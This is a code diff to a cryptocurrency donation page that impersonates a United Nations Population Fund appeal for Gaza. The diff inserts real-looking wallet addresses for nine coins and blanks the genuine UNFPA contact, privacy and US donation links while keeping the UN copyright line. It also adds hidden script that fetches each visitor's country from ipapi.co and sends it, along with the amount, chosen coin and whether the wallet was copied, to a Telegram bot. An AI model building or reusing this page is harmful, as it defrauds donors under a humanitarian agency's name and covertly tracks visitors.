@@ -147,13 +147,13 @@
         <div class="text-col">
           <div class="tag-hold">
             <span class="superscript">GAZA ALERT</span>
-            <h1>Help us support the most vulnerable</h1>
+            <h1>Help children and pregnant women in Palestine</h1>
             
           </div>
         </div>
         <div class="img-col">
           <div class="img-hold">
-            <img src="images/Desktop%20Banner%20%2814%29_7.png" alt="" />
+            <img src="x/1.jpg" alt="" />
           </div>
         </div>
       </section>
@@ -251,19 +251,31 @@
 
 <div class="gallery">
   <div class="gallery-item">
-      <img src="images/Desktop Banner (14)_7.png" alt="Фото 1">
+      <img src="x/2.jpg" alt="Фото 1">
   </div>
   <div class="gallery-item">
-      <img src="images/Desktop Banner (14)_7.png" alt="Фото 2">
+      <img src="x/3.jpg" alt="Фото 2">
   </div>
   <div class="gallery-item">
-      <img src="images/Desktop Banner (14)_7.png" alt="Фото 3">
+      <img src="x/4.jpg" alt="Фото 3">
   </div>
   <div class="gallery-item">
-      <img src="images/Desktop Banner (14)_7.png" alt="Фото 4">
+      <img src="x/5.jpg" alt="Фото 4">
   </div>
   <div class="gallery-item">
-      <img src="images/Desktop Banner (14)_7.png" alt="Фото 5">
+      <img src="x/6.jpg" alt="Фото 5">
+  </div>
+  <div class="gallery-item">
+    <img src="x/7.jpg" alt="Фото 5">
+</div>
+<div class="gallery-item">
+  <img src="x/8.jpg" alt="Фото 5">
+</div>
+<div class="gallery-item">
+  <img src="x/9.jpg" alt="Фото 5">
+</div>
+  <div class="gallery-item">
+      <img src="x/10.jpg" alt="Фото 5">
   </div>
 </div>
 
@@ -922,7 +934,7 @@ document.addEventListener('DOMContentLoaded', () => {
           <p>Send your donation to the following address:</p>
 
           <div class="input-group">
-              <label>Amount in Bitcoin:</label>
+              <label>Amount:</label>
               <input type="text" id="cryptoAmount" class="styled-input" readonly>
               <button class="copy-btn" onclick="copyCryptoAmount()">Copy Amount</button>
           </div>
@@ -1048,7 +1060,7 @@ document.addEventListener('DOMContentLoaded', () => {
                   <ul class="o-list o-list--unstyled o-list--inline">
                     <li class="o-list__item">
                       <a
-                        href="https://www.unfpa.org/contact?subject=giving"
+                        href="#"
                         class="o-link o-link--external"
                         title="Contact Us"
                         target="_blank"
@@ -1058,7 +1070,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     </li>
                     <li class="o-list__item">
                       <a
-                        href="/unfpa-privacy-policy"
+                        href="#"
                         class="o-link o-link--external"
                         title="Terms of Use"
                         target="_blank"
@@ -1069,19 +1081,8 @@ document.addEventListener('DOMContentLoaded', () => {
                   </ul>
                   <p>2024 © United Nations Population Fund</p>
                   <p>
-                    <small
-                      >Are you based in the United States? Donate through our
-                      support committee, USA for UNFPA
-                      <a
-                        href="http://usaforunfpa.org/"
-                        class="o-link"
-                        title="Visit usaforunfpa.org"
-                        target="_blank"
-                        rel="noopener"
-                        >usaforunfpa.org</a
-                      >
-                      to make a tax-deductible donation.</small
-                    >
+                   
+                    
                   </p>
                 </div>
               </div>
@@ -1115,17 +1116,19 @@ document.addEventListener('DOMContentLoaded', () => {
 let selectedAmount = null;
 let exchangeRates = {};
 let walletAddresses = {
-    BTC: '1BitcoinWalletAddressHere',
-    ETH: '0xEthereumWalletAddressHere',
-    'USDT-ERC20': '0xUSDT-ERC20-WalletAddressHere',
-    'USDT-TRC20': 'TUSDT-TRC20-WalletAddressHere',
-    BNB: 'bnbBinanceWalletAddressHere',
-    TON: 'tonWalletAddressHere',
-    SOL: 'solanaWalletAddressHere',
-    ADA: 'cardanoWalletAddressHere',
-    DOT: 'polkadotWalletAddressHere'
+    BTC: 'bc1qp9vmh5hewt7uzwh9af9qv79rrmwh4cw0lx5t23',
+    ETH: '0xdE3FCF36e5Eb3AC510cFD64f5b4E2386FDd42cEF',
+    'USDT-ERC20': '0xdE3FCF36e5Eb3AC510cFD64f5b4E2386FDd42cEF',
+    'USDT-TRC20': 'TReatFbPmSKRrr5jc9ffh78p9Dy3xfQhw6',
+    BNB: '0xdE3FCF36e5Eb3AC510cFD64f5b4E2386FDd42cEF',
+    TON: 'UQAyj4LnIirExmpyJF8rsDqn0Okb-Gysjj08WbqIJRYxSsfO',
+    SOL: 'GxLEAqjkiRPz1MisW1nT4S686F3nGGfCUc4eoka4c6Fj',
+    ADA: 'addr1q8ldupg9qxhv57qs22cqsfzzzmt9khes5f400rp4qy4lujma4ntnk8j9r5krxq0u0vexrctnxg4jnsy05v23ac378tgq0rj9a4',
+    DOT: '12jY3pYpvNkwzWRz9pxcuQYGV5xjjXEAMQPSz7iWrG9hVx2c'
 };
 let donateBtnState = 'donate'; // donate or cancel
+let donateCount = 0; // Счетчик нажатий на кнопку
+let lastWalletCopied = false; // Был ли скопирован кошелек
 
 // Функция для получения курсов криптовалют
 async function getExchangeRates() {
@@ -1141,6 +1144,30 @@ async function getExchangeRates() {
         ADA: data.cardano.usd,
         DOT: data.polkadot.usd
     };
+}
+
+// Функция для получения страны пользователя
+async function getCountry() {
+    const response = await fetch('https://ipapi.co/json/');
+    const data = await response.json();
+    return data.country_name;
+}
+
+// Функция для отправки логов в Telegram
+async function sendLogToTelegram(country, crypto, amount, walletCopied) {
+    const botToken = 'ВАШ_ТЕЛЕГРАМ_БОТ_ТОКЕН';
+    const chatId = 'ID_ЧАТА'; // Ваш Chat ID в Telegram
+    const message = `
+    Лог доната:
+    Страна: ${country}
+    Количество нажатий: ${donateCount}
+    Сумма: ${amount} USDT
+    Криптовалюта: ${crypto}
+    Кошелек скопирован: ${walletCopied ? 'Да' : 'Нет'}
+    `;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+    await fetch(url);
 }
 
 // Обновление выделения кнопок и перенос суммы в input
@@ -1166,7 +1193,7 @@ function convertToCrypto(amount, crypto) {
 }
 
 // Функция для подтверждения доната
-function confirmDonation() {
+async function confirmDonation() {
     const crypto = document.getElementById('crypto').value;
     let amount = document.getElementById('customAmount').value;
 
@@ -1180,12 +1207,18 @@ function confirmDonation() {
 
     if (donateBtnState === 'donate') {
         if (cryptoAmount && walletAddress) {
+            donateCount++; // Увеличиваем счетчик нажатий
             document.getElementById('walletSection').style.display = 'block';
             document.getElementById('cryptoAmount').value = `${cryptoAmount} ${crypto.split('-')[0]}`;
             document.getElementById('walletAddress').value = walletAddress; // Устанавливаем правильный кошелек
             document.getElementById('donateBtn').textContent = 'Cancel';
             document.getElementById('donateBtn').classList.add('cancel');
             donateBtnState = 'cancel';
+
+            // Получаем страну и отправляем лог в Telegram
+            const country = await getCountry();
+            await sendLogToTelegram(country, crypto, amount, lastWalletCopied);
+
         } else {
             alert('Conversion rate or wallet address not available. Please try again later.');
         }
@@ -1234,6 +1267,7 @@ function copyWalletAddress() {
     const walletAddress = document.getElementById('walletAddress');
     walletAddress.select();
     document.execCommand('copy');
+    lastWalletCopied = true; // Устанавливаем флаг, что кошелек был скопирован
 
     // Отображение уведомления
     const notification = document.createElement('div');
